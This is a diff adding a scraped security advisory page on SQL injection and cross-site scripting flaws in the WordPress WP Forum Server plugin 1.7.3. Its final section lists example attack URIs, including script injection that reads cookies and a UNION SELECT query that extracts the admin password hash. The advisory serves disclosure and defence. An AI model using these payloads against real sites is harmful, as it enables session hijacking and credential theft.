@@ -1,0 +1,99 @@
+#SpeeDr00t@Black Falcon<br>#bid53530<p><b><span style="font-size: 18pt;">WordPress WP Forum Server Plugin SQL Injection and Cross Site Scripting Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/53530/info">info</a><br><a href="http://www.securityfocus.com/bid/53530/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/53530/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/53530/solution">solution</a><br><a href="http://www.securityfocus.com/bid/53530/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				53530
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+				
+					CVE-2012-6622<br/>
+				
+					CVE-2012-6625<br/>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				May 15 2012 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Jan 24 2014 12:23AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				Heine Pedersen and Torben Jensen
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					WordPress WP Forum Server  1.7.3<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	Attackers can use a browser to exploit these issues. To exploit the cross-site scripting issues, an attacker must entice an unsuspecting user to follow a malicious URI.      <br/> <br/>The following example URIs are available:  <br/> <br/>http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;amp;amp;vasthtml_action=structure&amp;amp;amp;do=addforum&amp;amp;amp;groupid=%27%3E%3Cscript%3Ealert%281%29%3C/script%3E   <br/> <br/> http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;amp;amp;vasthtml_action=structure&amp;amp;amp;do=editgroup&amp;amp;amp;groupid='&amp;amp;gt;&amp;amp;lt;script&amp;amp;gt;alert(document.cookie);&amp;amp;lt;/script&amp;amp;gt;   <br/> <br/>http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;amp;amp;vasthtml_action=structure&amp;amp;amp;do=editgroup&amp;amp;amp;groupid=2 AND 1=0 UNION SELECT user_pass FROM wp_users WHERE ID=1   <br/> <br/>http://www.example.com/wp-admin/admin.php?page=forum-server/fs-admin/fs-admin.php&amp;amp;amp;vasthtml_action=usergroups&amp;amp;amp;do=edit_usergroup&amp;amp;amp;usergroup_id='&amp;amp;gt;&amp;amp;lt;script&amp;amp;gt;alert(document.cookie);&amp;amp;lt;/script&amp;amp;gt;
+	
+		<ul>
+</ul>
+</div>
